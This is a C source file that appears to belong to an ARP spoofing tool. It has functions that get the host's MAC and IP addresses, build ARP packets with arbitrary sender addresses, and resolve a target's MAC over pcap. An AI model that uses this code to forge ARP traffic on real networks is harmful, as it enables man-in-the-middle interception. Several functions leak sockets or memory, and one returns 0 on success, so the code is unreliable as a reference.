
#include "arp_spoofing.h"

int get_my_mac(uint8_t *dst) {
    int nSD; // Socket descriptor
    struct ifreq *ifr; // Interface request
    struct ifconf ifc;
    int i, numif;
    struct ifreq *r;
    struct sockaddr_in *sin;
    memset(&ifc, 0, sizeof(struct ifconf));
    ifc.ifc_ifcu.ifcu_req = NULL;
    ifc.ifc_len = 0;

    // Create a socket that we can use for all of our ioctls
    nSD = socket( PF_INET, SOCK_DGRAM, 0 );
    
    if ( nSD < 0 )  return 0;
    
    if(ioctl(nSD, SIOCGIFCONF, &ifc) < 0) return 0;
    
    if ((ifr = (ifreq*)  malloc(ifc.ifc_len)) == NULL) {
        return 0;
    }

    else {
        ifc.ifc_ifcu.ifcu_req = ifr;

        if (ioctl(nSD, SIOCGIFCONF, &ifc) < 0) {
            return 0;
        }
        numif = ifc.ifc_len / sizeof(struct ifreq);
        
        for (i = 0; i < numif; i++) {
            r = &ifr[i];
            sin = (struct sockaddr_in *)&r->ifr_addr;
        
            if (!strcmp(r->ifr_name, "lo"))
            continue; // skip loopback interface
    
            if(ioctl(nSD, SIOCGIFHWADDR, r) < 0) 
            return 0;
            
            memcpy(dst, r->ifr_hwaddr.sa_data, 6);
            return 0;
        }
    }
    close(nSD);
    free(ifr);
 
    return( 1 );
}

int get_my_ip (char *_ifr_name, uint32_t *my_ip) {
    struct ifreq ifr;
    char ipstr[40];
    int s;

    s = socket(AF_INET, SOCK_DGRAM, 0);
    strncpy(ifr.ifr_name, _ifr_name, IFNAMSIZ);

    if (ioctl(s, SIOCGIFADDR, &ifr) < 0) {
        return 0;
    } else {
        inet_ntop(AF_INET, ifr.ifr_addr.sa_data+2,
                ipstr,sizeof(struct sockaddr));
        *my_ip = inet_addr(ipstr);
        printf("myOwn IP Address is %s\n", ipstr);
    }
    return 1;
}

uint16_t my_ntohs(uint16_t num) {
        return ((num & 0xff00) >> 8) + ((num & 0xff) << 8);
}

void init_arp(arp* packet) {
    packet->eth.type = my_ntohs(ARP);
    packet->h_type = my_ntohs(ETH);
    packet->p_type = my_ntohs(IPV4);
    packet->h_size = 6;
    packet->p_size = 4;
}

void set_arp(arp *packet, uint8_t *eth_smac, uint8_t *eth_dmac, uint16_t opcode, uint8_t *smac, uint32_t sip, uint8_t *dmac, uint32_t dip) {
    init_arp(packet);
    memcpy(packet->eth.src_mac, eth_smac, 6);
    memcpy(packet->eth.dst_mac, eth_dmac, 6);
    memcpy(packet->sender_mac, smac, 6);
    memcpy(packet->target_mac, dmac, 6);
    packet->opcode = my_ntohs(opcode);
    *(uint32_t*)packet->sender_ip = sip;
    *(uint32_t*)packet->target_ip = dip;

}

arp *resolve_target_arp(pcap_t* pcap, pcap_pkthdr** header, const uint8_t **data, arp*send) {
    bool is_target;
    arp *packet;

    while (true) {
        packet = NULL;
        pcap_sendpacket(pcap, (u_char *)send, sizeof(arp));
        int res = pcap_next_ex(pcap, header, data);
        
        if (res == -1 || res == -2) break;
        if (!data) continue;
        
        packet = (arp*)*data;
        if(my_ntohs(packet->eth.type)==ARP) {
            if(my_ntohs(packet->opcode)==REPLY) {
                if (!memcmp(packet->sender_ip, send->target_ip, 4) && !memcmp(packet->target_ip, send->sender_ip, 4) )
                    break;
            }
        }
    }
    return packet;
}